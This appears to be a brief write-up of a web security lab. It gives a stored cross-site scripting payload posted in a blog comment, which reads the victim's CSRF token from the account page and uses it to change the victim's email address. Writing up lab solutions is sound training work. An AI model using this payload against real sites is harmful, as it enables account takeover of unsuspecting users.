STEPS I USED TO SOLVE THIS LAB
- Checked the page source to understand how the email update works
Submitted the following payload in a blog comment:

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
